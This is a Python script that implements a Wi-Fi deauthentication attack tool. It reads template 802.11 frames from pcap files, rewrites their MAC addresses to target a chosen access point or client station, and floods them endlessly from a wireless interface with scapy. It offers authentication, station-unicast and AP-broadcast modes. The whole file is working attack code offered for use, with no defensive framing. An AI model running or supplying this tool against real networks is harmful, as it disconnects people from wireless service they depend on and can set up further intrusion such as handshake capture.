import pyshark 
from scapy.all import sendp, RadioTap
import sys

class DeauthAttack():

    def __init__(self): 
        self.ap_mac = None 
        self.station_mac = None
        self.auth = None
        self.iface = None
        self.attack_packet = None
        self.parse()


    def set_authentication_deauth_packet(self, ap_mac=None, station_mac=None):
        '''send authentication to ap'''
        if ap_mac == None or station_mac == None:
            print('ap mac or station is none')
            return None
        cap = pyshark.FileCapture('./auth.pcapng', include_raw=True, use_json=True)
        packet = RadioTap(cap[0].get_raw_packet())
        packet.addr2 = station_mac 
        packet.addr1 = packet.addr3 = ap_mac
        self.attack_packet = packet


    def set_station_unicast_deauth_packet(self, ap_mac=None, station_mac=None):
        '''send deauth unicast to ap'''
        if ap_mac == None or station_mac == None:
            print('ap mac or station is none')
            return None
        cap = pyshark.FileCapture('./stationunicast.pcapng', include_raw=True, use_json=True)
        packet = RadioTap(cap[0].get_raw_packet())
        packet.addr2 = station_mac 
        packet.addr1 = packet.addr3 = ap_mac
        self.attack_packet = packet


    def set_ap_broadcast_deauth_packet(self, ap_mac=None):
        if ap_mac == None:
            print('ap address is none')
            return None

        cap = pyshark.FileCapture('./ap_broadcast.pcapng', include_raw=True, use_json=True)
        packet = RadioTap(cap[0].get_raw_packet())
        #packet.addr2 = packet.addr3 = '5e:cb:99:0b:b7:50'
        packet.addr2 = packet.addr3 = ap_mac 
        self.attack_packet = packet


    def parse(self):
        import argparse
        parser = argparse.ArgumentParser(prog='deauth_attack.py')
        parser.add_argument(dest='interface', action='store')
        parser.add_argument(dest='ap_mac', action='store')
        parser.add_argument(dest='station_mac', nargs='?', default=None)
        parser.add_argument('-auth', action='store_true') 
        args = parser.parse_args()
        self.ap_mac = args.ap_mac
        self.station_mac = args.station_mac
        self.auth = args.auth
        self.iface = args.interface

    def start(self, inter=0.1): 
        if(self.station_mac != None and self.auth == True):
            print('authentication deauth-attck mode')
            self.set_authentication_deauth_packet(self.ap_mac, self.station_mac)
        elif(self.station_mac != None and self.auth == False):
            print('station unicast deauth-attck mode')
            self.set_station_unicast_deauth_packet(self.ap_mac, self.station_mac)
        else:
            print('ap broadcast deaut-attack mode')
            self.set_ap_broadcast_deauth_packet(self.ap_mac)

        sendp(self.attack_packet,iface=self.iface,inter=inter, loop=1)


if __name__ == '__main__':
    deauth_attack = DeauthAttack()
    deauth_attack.start(0.01)



